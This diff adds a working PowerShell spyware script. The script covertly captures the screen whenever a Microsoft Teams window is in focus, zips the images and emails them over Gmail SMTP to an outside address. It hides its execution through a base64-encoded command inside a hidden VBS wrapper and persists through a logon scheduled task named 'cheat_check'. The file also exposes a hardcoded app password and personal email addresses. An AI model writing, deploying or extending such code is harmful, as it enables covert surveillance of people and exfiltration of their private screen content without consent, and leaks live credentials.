@@ -1,0 +1,135 @@
+"
+ $script = @'
+# Gmail SMTP settings
+$smtpServer = "smtp.gmail.com"
+$smtpPort = 587
+$fromEmail = "screenshots@gmail.com"
+$toEmail = "alaa.brhouma@gmail.com"
+$smtpUsername = "ala.benrhouma@koedia.com"    # Your Gmail address again
+$smtpPassword = "jkrw jmnq utxg traw"       # Your Gmail App Password (not your regular password)
+$screenshotFolder = "C:\temp\Screenshots"
+$ziptimestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$zipFile = "C:\temp\Screenshots\Screenshots_" + $ziptimestamp + ".zip"
+$screenshotInterval = 4 # Screenshot every 2 seconds when Teams is active
+$minScreenshots = 25  # Send email when there are more than 25 screenshots
+
+# Create screenshot folder if it doesn't exist
+if (!(Test-Path -Path $screenshotFolder)) {
+    New-Item -ItemType Directory -Path $screenshotFolder | Out-Null
+}
+
+# Function to take a screenshot
+function Take-Screenshot {
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $screenshotPath = Join-Path $screenshotFolder "screenshot_$timestamp.png"
+    
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+    $graphics.Dispose()
+    $bitmap.Dispose()
+}
+
+# Function to check if Teams is the active window
+function Is-Teams-Active {
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class WinAPI {
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
+    }
+"@
+    $buffer = New-Object System.Text.StringBuilder 256
+    [WinAPI]::GetWindowText([WinAPI]::GetForegroundWindow(), $buffer, $buffer.Capacity) | Out-Null
+    return $buffer.ToString() -like "*Teams*"
+}
+
+# Function to compress screenshots into a zip file
+function Compress-Screenshots {
+    if (Test-Path $zipFile) { Remove-Item $zipFile }
+    Compress-Archive -Path "$screenshotFolder\*.png" -DestinationPath $zipFile
+}
+
+# Function to send an email with the zip file
+function Send-Zip {
+    if (Test-Path $zipFile) {
+        $message = New-Object System.Net.Mail.MailMessage
+        $message.From = $fromEmail
+        $message.To.Add($toEmail)
+        $message.Subject = "Screenshots Batch - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $message.Body = "Attached is the batch of screenshots taken."
+        $attachment = New-Object System.Net.Mail.Attachment($zipFile)
+        $message.Attachments.Add($attachment)
+
+        $smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
+        $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUsername, $smtpPassword)
+        $smtp.EnableSsl = $true
+        $smtp.Send($message)
+        
+        $attachment.Dispose()
+        $message.Dispose()
+    }
+}
+
+# Main loop
+while ($true) {
+    if (Is-Teams-Active) {
+        Take-Screenshot
+    }
+    Start-Sleep -Seconds $screenshotInterval
+
+    # Check if there are more than 25 screenshots in the folder
+    $screenshotFiles = Get-ChildItem -Path $screenshotFolder -Filter "*.png"
+    if ($screenshotFiles.Count -gt $minScreenshots) {
+        Compress-Screenshots
+        Send-Zip
+        Remove-Item "$screenshotFolder\*.png" -Force
+        Remove-Item $zipFile -Force
+        Write-Output "Email sent and screenshots cleaned up."
+    } else {
+        Write-Output "Less than 25 images, not sending email."
+    }
+}
+
+'@
+
+
+# Identify active session and user
+$username = $env:USERNAME
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+
+$vbs_path = "C:\temp\vbs_wrapper.vbs"
+if (!(Test-Path -Path "C:\temp")) {
+    New-Item -ItemType Directory -Path "C:\temp" | Out-Null
+}
+$vbscript = @"
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encodedCommand", 0, False
+Set objShell = Nothing
+"@
+
+$vbscript| Out-File -FilePath "$vbs_path"
+
+
+$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "$vbs_path"
+#$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Minimized  -NoProfile -EncodedCommand $encodedCommand"
+$taskName = "cheat_check"
+$Trigger_SessionLogon = New-ScheduledTaskTrigger -AtLogOn -User "$username" # First trigger at user logon
+$Principal = New-ScheduledTaskPrincipal -UserId "$username" -LogonType Interactive
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName $taskName -Action $Action -Trigger $Trigger_SessionLogon -Principal $Principal -Settings $Settings -Force
+
+Start-ScheduledTask -TaskName $taskName
+
+"
